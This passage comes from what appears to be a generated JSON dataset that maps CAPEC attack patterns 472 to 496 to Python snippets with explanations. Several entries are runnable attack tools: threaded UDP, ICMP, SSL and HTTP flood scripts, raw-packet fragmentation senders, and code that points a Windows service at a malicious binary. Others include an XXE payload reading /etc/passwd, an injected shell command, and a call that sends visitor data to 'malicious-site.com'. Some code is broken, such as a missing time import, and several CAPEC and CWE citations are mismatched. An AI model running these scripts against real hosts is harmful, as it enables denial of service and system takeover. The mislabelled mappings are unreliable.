        "description": "This Python code snippet demonstrates a vulnerability to Search Order Hijacking. The `load_library` function attempts to load a library named 'example.dll' from the current working directory. This is an example of CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), where the application uses a fixed search path that can be controlled by an attacker. If an attacker places a malicious 'example.dll' in the current directory, the application will load this rogue library instead of the legitimate one, potentially leading to arbitrary code execution."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    # Exposing sensitive information (CWE-200)\n    if 'Chrome' in user_agent:\n        browser = 'Chrome'\n    elif 'Firefox' in user_agent:\n        browser = 'Firefox'\n    else:\n        browser = 'Other'\n\n    # Using GET request with sensitive information (CWE-598)\n    response = requests.get(f'http://malicious-site.com/collect?browser={browser}')\n\n    # Improper neutralization of input (CWE-79)\n    template = f'<h1>Welcome, {browser} user!</h1>'\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that performs browser fingerprinting, which is the main idea of the CAPEC. The code extracts the 'User-Agent' header from incoming HTTP requests to determine the type of browser the user is using. This information is then sent to a malicious site using a GET request, exposing sensitive information (CWE-200, CWE-598). Additionally, the code improperly neutralizes user input when generating the web page (CWE-79), which could lead to cross-site scripting (XSS) vulnerabilities. The code represents how an attacker might gather browser information to tailor further attacks based on the identified browser type."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulate a message and a fake signature\nmessage = b'This is a secure message.'\nsecret_key = b'secret'\n\n# Vulnerable: Using a weak hash function (MD5) for HMAC\nfake_signature = hmac.new(secret_key, message, hashlib.md5).hexdigest()\n\n# Simulate receiving the message and verifying the signature\nreceived_message = message\nreceived_signature = fake_signature\n\n# Vulnerable: Improper input validation and weak cryptographic algorithm\nif hmac.new(secret_key, received_message, hashlib.md5).hexdigest() == received_signature:\n    print('Message is from a trusted source.')\nelse:\n    print('Message verification failed.')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of message signing and verification, embodying the 'Signature Spoof' CAPEC. The code uses a weak cryptographic algorithm (MD5) for HMAC, which is susceptible to collision attacks (CWE-327). It also lacks proper input validation (CWE-20) and does not ensure message integrity during transmission (CWE-924). An attacker could exploit these weaknesses to spoof the signature, making the recipient believe the message is from a trusted source, leading to potential malicious actions."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import os\nimport hashlib\nimport base64\n\n# Simulate storing a private key insecurely\nprivate_key = 'my_private_key'\nwith open('private_key.txt', 'w') as f:\n    f.write(private_key)\n\n# Simulate an attacker stealing the private key\nwith open('private_key.txt', 'r') as f:\n    stolen_key = f.read()\n\n# Attacker uses the stolen key to sign a message\nmessage = 'Important transaction'\nsignature = base64.b64encode(hashlib.sha256((message + stolen_key).encode()).digest()).decode()\n\n# Victim verifies the signature, assuming it is from a trusted source\ntrusted_public_key = 'my_public_key'  # In a real scenario, this would be used to verify the signature\nif signature == base64.b64encode(hashlib.sha256((message + private_key).encode()).digest()).decode():\n    print('Signature verified. Performing the action...')\nelse:\n    print('Signature verification failed.')",
        "description": "This Python code snippet demonstrates a scenario where an attacker steals a private key stored insecurely (CWE-522) and uses it to forge a signature. The victim then verifies the signature, assuming it is from a trusted source, leading to an authentication bypass (CWE-290). The code highlights the vulnerability of storing sensitive credentials insecurely and the potential for signature spoofing if an attacker gains access to these credentials."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated verification function\n# CWE-347: Improper Verification of Cryptographic Signature\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# CWE-295: Improper Certificate Validation\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-305: Authentication Bypass by Primary Weakness\n\ndef verify_signature(message, signature, key):\n    # Using a weak hash function (MD5) - CWE-327\n    expected_signature = hmac.new(key.encode(), message.encode(), hashlib.md5).hexdigest()\n    \n    # Improper verification of the signature - CWE-347\n    if signature == expected_signature:\n        return True\n    else:\n        return False\n\n# Example usage\nmessage = \"Important message\"\nkey = \"secret_key\"\n\n# Adversary can generate a valid signature without knowing the key\n# because of the weak hash function and improper verification\nforged_signature = hmac.new(key.encode(), message.encode(), hashlib.md5).hexdigest()\n\n# This should not be True if the verification was proper\nis_valid = verify_signature(message, forged_signature, key)\nprint(f\"Is the signature valid? {is_valid}\")",
        "description": "This Python code snippet demonstrates a vulnerable signature verification process. The `verify_signature` function uses a weak cryptographic algorithm (MD5) to generate an HMAC, which is a risky practice (CWE-327). The function then improperly verifies the cryptographic signature by directly comparing the provided signature with the expected one (CWE-347). This setup allows an adversary to generate a valid signature without knowing the key, exploiting the cryptographic weakness in the signature verification algorithm implementation, which is the main idea of the CAPEC. The example usage shows how an adversary can forge a valid signature, leading to an authentication bypass (CWE-290, CWE-305)."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated function to verify a signature\n# CWE-347: Improper Verification of Cryptographic Signature\ndef verify_signature(message, signature, secret_key):\n    expected_signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()\n    return hmac.compare_digest(expected_signature, signature)\n\n# Simulated function to parse and display a message\n# CWE-290: Authentication Bypass by Spoofing\ndef parse_message(data_blob):\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-300: Channel Accessible by Non-Endpoint\n    try:\n        message, signature = data_blob.split(':')\n        if verify_signature(message, signature, 'secret_key'):\n            print(f\"Message from trusted source: {message}\")\n        else:\n            print(\"Signature verification failed!\")\n    except Exception as e:\n        print(f\"Error parsing message: {e}\")\n\n# Simulated attacker creating a spoofed data blob\nattacker_message = \"Important update\"\nattacker_signature = \"fake_signature\"\nspoofed_data_blob = f\"{attacker_message}:{attacker_signature}\"\n\n# Victim parsing the spoofed message\nparse_message(spoofed_data_blob)",
        "description": "This Python code snippet demonstrates a scenario where an attacker exploits weaknesses in signature verification and message parsing to spoof a signature. The `verify_signature` function is intended to verify the cryptographic signature of a message, but it is vulnerable to CWE-347 (Improper Verification of Cryptographic Signature) because it uses a hardcoded secret key and does not handle key management securely. The `parse_message` function simulates the parsing of a data blob, which is vulnerable to CWE-290 (Authentication Bypass by Spoofing) as it does not properly authenticate the source of the message. Additionally, the function does not correctly handle the destination and integrity of the message (CWE-941, CWE-924, CWE-300), allowing an attacker to create a spoofed data blob that appears to be from a trusted source. The attacker creates a spoofed message with a fake signature, and the victim's software incorrectly parses and displays it as a trusted message."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated signed and unsigned content\nsigned_content = b'Signed content'\nunsigned_content = b'Unsigned content'\n\n# Secret key for HMAC\nsecret_key = b'secret'\n\n# Generate HMAC for signed content\nsigned_hmac = hmac.new(secret_key, signed_content, hashlib.sha256).hexdigest()\n\n# Function to verify HMAC\ndef verify_hmac(content, received_hmac):\n    calculated_hmac = hmac.new(secret_key, content, hashlib.sha256).hexdigest()\n    return hmac.compare_digest(calculated_hmac, received_hmac)\n\n# Vulnerable function that processes both signed and unsigned content\n# without proper verification\n\ndef process_content(content, received_hmac=None):\n    if received_hmac:\n        if verify_hmac(content, received_hmac):\n            print('Signed content verified and processed:', content)\n        else:\n            print('Invalid HMAC. Content rejected.')\n    else:\n        # Unsigned content is processed without verification\n        print('Unsigned content processed:', content)\n\n# Example usage\nprocess_content(signed_content, signed_hmac)  # Properly signed content\nprocess_content(unsigned_content)  # Unsigned content",
        "description": "This Python code snippet demonstrates a vulnerability where both signed and unsigned content are processed by the same function without proper distinction. The `process_content` function processes signed content by verifying its HMAC, but it also processes unsigned content without any verification. This embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' by showing how an attacker could exploit the lack of proper verification for unsigned content. The related CWEs are represented as follows: CWE-347 (Improper Verification of Cryptographic Signature) is shown by the verification process, CWE-693 (Protection Mechanism Failure) is demonstrated by the lack of a robust mechanism to differentiate and handle signed and unsigned content, and CWE-311 (Missing Encryption of Sensitive Data) is implied by the lack of encryption in the example."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32serviceutil\nimport win32service\nimport win32api\nimport win32con\n\n# Define the service name and the malicious binary path\nservice_name = 'MyService'\nmalicious_binary = 'C:\\malicious\\malicious.exe'\n\n# Open the service manager\nscm_handle = win32service.OpenSCManager(None, None, win32con.SC_MANAGER_ALL_ACCESS)\n\n# Open the service\nservice_handle = win32service.OpenService(scm_handle, service_name, win32service.SERVICE_ALL_ACCESS)\n\n# Change the service configuration to point to the malicious binary\nwin32service.ChangeServiceConfig(\n    service_handle,\n    win32service.SERVICE_NO_CHANGE,\n    win32service.SERVICE_NO_CHANGE,\n    win32service.SERVICE_NO_CHANGE,\n    malicious_binary,\n    None,\n    0,\n    None,\n    None,\n    None,\n    None\n)\n\n# Close the service and service manager handles\nwin32service.CloseServiceHandle(service_handle)\nwin32service.CloseServiceHandle(scm_handle)\n\nprint(f'Service {service_name} configuration modified to execute {malicious_binary}')",
        "description": "This Python code snippet demonstrates how an adversary could exploit improper access control (CWE-284) to modify the configuration of a Windows service to execute a malicious binary. The code uses the `pywin32` library to interact with the Windows Service Control Manager (SCM). It opens the SCM with full access, opens the specified service, and changes its configuration to point to a malicious executable. This represents the main idea of the CAPEC 'Modification of Windows Service Configuration' by showing how an attacker can replace a legitimate service binary with a malicious one, potentially leading to unauthorized code execution."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context that does not verify certificates\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# Connect to a server with the insecure context\nhostname = 'example.com'\nport = 443\n\nwith socket.create_connection((hostname, port)) as sock:\n    with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n        print(ssock.version())\n        # This will accept any certificate, including a malicious root certificate\n        print(ssock.getpeercert())",
        "description": "This Python code snippet demonstrates an insecure SSL/TLS connection by creating an SSL context that does not verify certificates. The context is configured to disable hostname checking and certificate verification, which embodies the main idea of the CAPEC 'Malicious Root Certificate'. This insecure setup allows an adversary to exploit weaknesses in certificate validation (CWE-295, CWE-296, CWE-297, CWE-599) and potentially install a malicious root certificate. The code connects to a server using this insecure context, which would accept any certificate, including a malicious one, thus representing the vulnerability described."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import os\nimport subprocess\n\n# Vulnerable function that runs a command in a virtualized environment\n# without proper isolation or validation\n\ndef run_command_in_vm(command):\n    # Simulate running a command in a virtual machine\n    vm_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = vm_process.communicate()\n    return stdout, stderr\n\n# Example usage\nif __name__ == '__main__':\n    # This command could be provided by an attacker\n    malicious_command = 'echo Hello && cat /etc/passwd'\n    output, error = run_command_in_vm(malicious_command)\n    print('Output:', output.decode())\n    print('Error:', error.decode())",
        "description": "This Python code snippet demonstrates a vulnerable function that runs a command in a virtualized environment without proper isolation or validation. The function `run_command_in_vm` uses `subprocess.Popen` to execute a command, simulating the execution within a virtual machine. However, it does not implement any isolation or validation mechanisms, making it susceptible to attacks where an adversary can escape the virtualized environment and access sensitive information or execute unauthorized code. This embodies the main idea of the CAPEC 'Escaping Virtualization' and highlights related CWEs such as 'Improper Isolation or Compartmentalization' and 'Process Control'."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import requests\nimport ssl\nimport socket\n\n# Create a custom SSL context to leave the SNI field blank (Domainless Fronting)\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# Create a socket and wrap it with the SSL context\nsock = socket.create_connection(('example.com', 443))\nssl_sock = context.wrap_socket(sock, server_hostname='')\n\n# Create an HTTP request with a different Host header (Domain Fronting)\nhttp_request = \"\"\"GET / HTTP/1.1\r\nHost: malicious.com\r\n\r\n\"\"\"\n\n# Send the HTTP request through the SSL socket\nssl_sock.sendall(http_request.encode())\n\n# Receive the response\nresponse = ssl_sock.recv(4096)\nprint(response.decode())\n\n# Close the sockets\nssl_sock.close()\nsock.close()",
        "description": "This Python code snippet demonstrates the concept of 'Contradictory Destinations in Traffic Routing Schemes' by implementing both Domain Fronting and Domainless Fronting techniques. The code creates a custom SSL context to leave the SNI field blank, representing Domainless Fronting. It then establishes a connection to 'example.com' but sends an HTTP request with a Host header set to 'malicious.com', representing Domain Fronting. This can lead to traffic being routed to an unintended destination, embodying the main idea of the CAPEC. The related CWEs are addressed by showing how improper restriction of communication channels, inconsistent interpretation of HTTP requests, and incorrectly specified destinations can be exploited."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\n\n# Vulnerable server code that does not limit resource allocation\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    # No limit on the number of connections or resources allocated\n    client_socket.send(bytes('Welcome to the server!', 'utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a simple TCP server that is vulnerable to a TCP Flood attack. The server listens for incoming connections on port 8080 and accepts them without any limit on the number of connections or resources allocated (CWE-770). This lack of resource allocation control can be exploited by an adversary to perform a TCP Flood attack, overwhelming the server and denying legitimate users access to the service. The code does not implement any throttling or resource management, making it susceptible to denial-of-service attacks."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (untrusted source)\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ntry:\n    # Parse the XML data without validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-230 and CAPEC-231, specifically focusing on CWE-611: Improper Restriction of XML External Entity Reference. The code parses an XML document from an untrusted source without proper validation, allowing an attacker to include an external entity reference that can access sensitive files on the server (e.g., /etc/passwd). This represents a common XML External Entity (XXE) attack, where the XML parser processes external entities, potentially leading to data breaches or other security issues."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import random\nimport hashlib\n\n# Weak random number generator\nrandom.seed(12345)\n\n# Generate a 'private key' using a predictable random number\nprivate_key = random.randint(1, 1000000)\n\n# Simulate signing a message\nmessage = 'Important transaction details'\nsignature = hashlib.sha256((message + str(private_key)).encode()).hexdigest()\n\n# Attacker can predict the private key and forge the signature\nattacker_private_key = 12345  # Attacker knows the seed and can predict the private key\nforged_signature = hashlib.sha256((message + str(attacker_private_key)).encode()).hexdigest()\n\nprint(f'Original Signature: {signature}')\nprint(f'Forged Signature: {forged_signature}')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can predict a private key due to the use of a weak random number generator (CWE-330, CWE-1241). The private key is generated using a predictable seed, allowing the attacker to recreate the key and forge a signature. The code simulates signing a message with a private key and shows how an attacker can generate a forged signature by predicting the private key. This embodies the main idea of CAPEC-151: 'Signature Spoofing by Key Recreation'."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\nimport random\nimport threading\n\n# Function to perform UDP flood attack\ndef udp_flood(target_ip, target_port, duration):\n    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    bytes_to_send = random._urandom(1024)  # CWE-770: No limit on resource allocation\n    timeout = time.time() + duration\n    while time.time() < timeout:\n        client.sendto(bytes_to_send, (target_ip, target_port))  # CWE-406: No control on message volume\n\n# Target details\ntarget_ip = '192.168.1.1'  # CWE-941: Incorrectly specified destination\ntarget_port = 80\nattack_duration = 10  # Duration in seconds\n\n# Start the attack\nthread = threading.Thread(target=udp_flood, args=(target_ip, target_port, attack_duration))\nthread.start()",
        "description": "This Python code snippet demonstrates a basic UDP flood attack, which is a type of denial-of-service (DoS) attack. The code creates a UDP socket and sends a large number of packets to a specified target IP and port for a given duration. The attack consumes network bandwidth and can overwhelm the target's resources, including firewalls. The code embodies the main idea of the CAPEC by illustrating how an adversary can exploit the UDP protocol to perform a flooding attack. The related CWEs are represented as follows: CWE-770 (no limit on resource allocation), CWE-406 (no control on message volume), and CWE-941 (incorrectly specified destination)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\nimport threading\n\n# Function to perform ICMP flood attack\ndef icmp_flood(target_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    packet = b'\\x08\\x00' + b'\\x00' * 46  # ICMP Echo Request with payload\n    while True:\n        sock.sendto(packet, (target_ip, 0))\n\n# Start multiple threads to simulate high-rate ICMP flood\nthreads = []\ntarget_ip = '192.168.1.1'  # Example target IP\nfor _ in range(100):  # Number of threads to simulate high traffic\n    thread = threading.Thread(target=icmp_flood, args=(target_ip,))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates an ICMP flood attack, which is a type of Denial of Service (DoS) attack. The code creates multiple threads to send a high rate of ICMP Echo Request packets (ping) to a target IP address. This can overwhelm the target's network bandwidth, making it difficult for legitimate users to access the service. The code also highlights CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of threads or the rate of packet sending, leading to potential resource exhaustion. Additionally, the use of raw sockets and the ability to spoof IP addresses are implicit in the attack, aligning with the session-less nature of ICMP described in the CAPEC."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "from flask import Flask, request\nimport threading\nimport time\n\napp = Flask(__name__)\n\n# Simulate resource allocation without limits\nactive_sessions = []\n\n@app.route('/resource', methods=['GET'])\ndef allocate_resource():\n    session_id = request.args.get('session_id')\n    if session_id:\n        active_sessions.append(session_id)\n        # Simulate resource consumption\n        time.sleep(5)\n        return 'Resource allocated to session: {}'.format(session_id)\n    return 'No session ID provided', 400\n\n# Function to simulate HTTP flood attack\ndef http_flood_attack():\n    import requests\n    while True:\n        requests.get('http://localhost:5000/resource?session_id=attacker')\n\nif __name__ == '__main__':\n    # Start the HTTP flood attack in a separate thread\n    attack_thread = threading.Thread(target=http_flood_attack)\n    attack_thread.start()\n    # Run the Flask app\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web service that allocates resources based on session IDs provided via HTTP GET requests. The 'allocate_resource' function simulates resource allocation without any limits, representing CWE-770 (Allocation of Resources Without Limits or Throttling). The 'http_flood_attack' function simulates an HTTP flood attack by continuously sending GET requests with a session ID of 'attacker', which consumes server resources and can lead to denial of service, embodying the main idea of CAPEC-488 (HTTP Flood). The code demonstrates how an attacker can exploit the lack of resource limits to perform a denial-of-service attack."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import ssl\nimport socket\nimport threading\n\n# Function to create SSL connections and flood the server\ndef ssl_flood(target_host, target_port):\n    context = ssl.create_default_context()\n    while True:\n        try:\n            with socket.create_connection((target_host, target_port)) as sock:\n                with context.wrap_socket(sock, server_hostname=target_host) as ssock:\n                    # Renegotiate SSL connection repeatedly\n                    ssock.do_handshake()\n        except Exception as e:\n            pass\n\n# Target server details\nhost = 'example.com'\nport = 443\n\n# Create multiple threads to simulate a flood attack\nthreads = []\nfor _ in range(100):  # Number of threads can be increased to intensify the attack\n    thread = threading.Thread(target=ssl_flood, args=(host, port))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates an SSL flood attack, which is a type of Denial of Service (DoS) attack. The code creates multiple threads to establish SSL connections to a target server and repeatedly renegotiates the SSL handshake. This consumes a significant amount of server resources, potentially leading to resource exhaustion and denial of service for legitimate users. The code embodies the main idea of CAPEC-147 (SSL Flood) and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-410 (Insufficient Resource Pool), and CWE-400 (Uncontrolled Resource Consumption)."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import socket\n\n# Vulnerable UDP server that can be exploited for amplification attacks\nclass AmplificationServer:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.server_socket.bind((host, port))\n        print(f'Server listening on {host}:{port}')\n\n    def start(self):\n        while True:\n            data, addr = self.server_socket.recvfrom(1024)  # Receive request\n            print(f'Received request from {addr}')\n            response = self.generate_large_response(data)\n            self.server_socket.sendto(response, addr)  # Send amplified response\n\n    def generate_large_response(self, data):\n        # Generate a response that is significantly larger than the request\n        return data * 1000\n\nif __name__ == '__main__':\n    server = AmplificationServer()\n    server.start()",
        "description": "This Python code snippet demonstrates a simple UDP server that is vulnerable to amplification attacks. The server listens for incoming UDP requests and responds with a much larger payload. The `generate_large_response` method multiplies the incoming data by 1000, creating a significant amplification effect. This embodies the main idea of the CAPEC by showing how an adversary can exploit the server to generate large amounts of traffic directed at a target. The code also reflects related CWEs, such as insufficient control of network message volume (CWE-406) and asymmetric resource consumption (CWE-405), by not imposing any restrictions on the size of the response or the number of requests it handles."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import re\n\ndef expand_macros(data):\n    pattern = re.compile(r'\\{\\{(.*?)\\}\\}')\n    expanded_data = data\n    for _ in range(1000):  # Arbitrary large number to simulate excessive expansion\n        matches = pattern.findall(expanded_data)\n        if not matches:\n            break\n        for match in matches:\n            expanded_data = expanded_data.replace(f'{{{{{match}}}}}', match * 1000)  # Exponential growth\n    return expanded_data\n\n# Example usage\ninput_data = '{{macro}}'\ntry:\n    result = expand_macros(input_data)\n    print(f'Expanded data length: {len(result)}')\nexcept MemoryError:\n    print('MemoryError: Data expansion caused excessive memory allocation')",
        "description": "This Python code snippet demonstrates a vulnerable macro expansion function that can lead to a denial of service through excessive memory allocation. The `expand_macros` function uses a regular expression to find and replace macros in the input data. Each macro is replaced with a significantly larger string, causing exponential growth in memory usage. The loop runs a large number of iterations to simulate excessive expansion, which can lead to a MemoryError. This example embodies the CAPEC 'Quadratic Data Expansion' by showing how an adversary could exploit macro-like substitution to cause a denial of service. The related CWEs are represented by the lack of limits on resource allocation (CWE-770), improper handling of memory allocation (CWE-1325), and the potential for excessively large data structures (CWE-1043)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import re\n\ndef vulnerable_regex(input_string):\n    # CWE-1333: Inefficient Regular Expression Complexity\n    # CWE-777: Regular Expression without Anchors\n    pattern = re.compile(r'(a+)+$')\n    match = pattern.match(input_string)\n    return match is not None\n\n# Example of input that causes exponential blowup\ninput_string = 'a' * 30 + '!'  # This input will cause the regex to backtrack excessively\nprint(vulnerable_regex(input_string))",
        "description": "This Python code snippet demonstrates a regular expression vulnerability known as Regular Expression Exponential Blowup (CAPEC-400). The function `vulnerable_regex` uses a regular expression pattern `(a+)+$` which is prone to exponential time complexity due to nested quantifiers. This pattern can cause excessive backtracking, especially with inputs like 'a' * 30 + '!', leading to high CPU consumption (CWE-1333). The regex is also not anchored at the start (CWE-777), which can allow for inefficient processing. The provided input string 'a' * 30 + '!' is designed to trigger this inefficiency, illustrating how an attacker could exploit this vulnerability to cause a denial of service by consuming excessive resources."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Example SOAP message with a large array declaration\nsoap_message = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ns1:largeArray xmlns:ns1=\"http://example.com/\">\n         <ns1:item>1</ns1:item>\n         <ns1:item>2</ns1:item>\n         <!-- Imagine 1,000,000 more items here -->\n      </ns1:largeArray>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Parse the SOAP message\ntry:\n    root = ET.fromstring(soap_message)\n    # Simulate processing of the large array\n    items = root.findall('.//ns1:item', namespaces={'ns1': 'http://example.com/'})\n    print(f'Number of items: {len(items)}')\nexcept ET.ParseError as e:\n    print(f'Error parsing SOAP message: {e}')\n\n# Note: This code does not implement any resource allocation limits or throttling\n# and is vulnerable to SOAP Array Blowup attack.",
        "description": "This Python code snippet demonstrates a SOAP Array Blowup attack. It constructs a SOAP message with a large array declaration and parses it using the xml.etree.ElementTree library. The code simulates processing the array items but does not implement any resource allocation limits or throttling, making it vulnerable to memory exhaustion attacks. This example highlights CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation) by showing how an attacker can exploit the lack of resource management to exhaust memory resources."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import socket\n\n# Create a raw socket\ns = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Function to fragment TCP packet\ndef fragment_tcp_packet(packet, fragment_size):\n    fragments = [packet[i:i+fragment_size] for i in range(0, len(packet), fragment_size)]\n    return fragments\n\n# Example TCP packet (simplified)\ntcp_packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6\\xc0\\xa8\\x00\\x68\\xc0\\xa8\\x00\\x01'  # IP header + TCP header\n\n# Fragment the packet\nfragments = fragment_tcp_packet(tcp_packet, 8)  # Fragment size of 8 bytes\n\n# Send the fragments\nfor fragment in fragments:\n    s.sendto(fragment, ('192.168.0.1', 0))\n\ns.close()",
        "description": "This Python code snippet demonstrates a basic example of TCP fragmentation. It creates a raw socket to send TCP packets and defines a function to fragment a given TCP packet into smaller pieces. The example TCP packet is then fragmented into 8-byte pieces and sent to a target IP address (192.168.0.1). This code embodies the main idea of the CAPEC by showing how an adversary might fragment a TCP packet to avoid network filtering rules. The related CWEs provide context on potential weaknesses, such as improper resource handling and cleartext transmission, which could be exploited in such an attack."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import socket\nimport random\n\n# Function to generate a large UDP packet\ndef generate_large_packet(size):\n    return b'A' * size\n\n# Function to send fragmented UDP packets\ndef send_fragmented_packets(target_ip, target_port, packet_size, num_packets):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    for _ in range(num_packets):\n        packet = generate_large_packet(packet_size)\n        sock.sendto(packet, (target_ip, target_port))\n    sock.close()\n\n# Configuration\nTARGET_IP = '192.168.1.1'\nTARGET_PORT = 12345\nPACKET_SIZE = 2000  # Larger than typical MTU to force fragmentation\nNUM_PACKETS = 1000\n\n# Execute the attack\nsend_fragmented_packets(TARGET_IP, TARGET_PORT, PACKET_SIZE, NUM_PACKETS)",
        "description": "This Python code snippet demonstrates a UDP Fragmentation attack. The `generate_large_packet` function creates a large UDP packet of a specified size, which is larger than the typical MTU (1500 bytes) to force fragmentation. The `send_fragmented_packets` function sends a specified number of these large packets to a target IP and port, causing the target server to consume resources such as bandwidth, CPU, and memory buffers for reassembling the fragmented packets. This attack leverages CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of packets sent, and CWE-406 (Insufficient Control of Network Message Volume) by not monitoring or controlling the volume of network traffic."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import socket\n\n# Function to create a fragmented ICMP packet\ndef create_fragmented_icmp_packet(fragment_size):\n    icmp_header = b'\\x08\\x00'  # ICMP Echo Request\n    payload = b'A' * fragment_size\n    return icmp_header + payload\n\n# Function to send fragmented ICMP packets\ndef send_fragmented_icmp(target_ip, fragment_size, num_fragments):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    for _ in range(num_fragments):\n        packet = create_fragmented_icmp_packet(fragment_size)\n        sock.sendto(packet, (target_ip, 1))\n    sock.close()\n\n# Target IP and parameters\nTARGET_IP = '192.168.1.1'\nFRAGMENT_SIZE = 1480  # Fragment size\nNUM_FRAGMENTS = 10000  # Number of fragments to send\n\n# Send fragmented ICMP packets to the target\nsend_fragmented_icmp(TARGET_IP, FRAGMENT_SIZE, NUM_FRAGMENTS)",
        "description": "This Python code snippet demonstrates a basic ICMP Fragmentation attack. The `create_fragmented_icmp_packet` function generates a fragmented ICMP packet with a specified fragment size. The `send_fragmented_icmp` function sends a large number of these fragmented packets to a target IP address. The parameters `TARGET_IP`, `FRAGMENT_SIZE`, and `NUM_FRAGMENTS` define the target IP address, the size of each fragment, and the number of fragments to send, respectively. This attack can overwhelm the target's resources, potentially causing it to become non-responsive. The code embodies CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of fragments sent, leading to resource exhaustion. It also touches on CWE-404 (Improper Resource Shutdown or Release) as the resources (sockets) are not properly managed."
    },
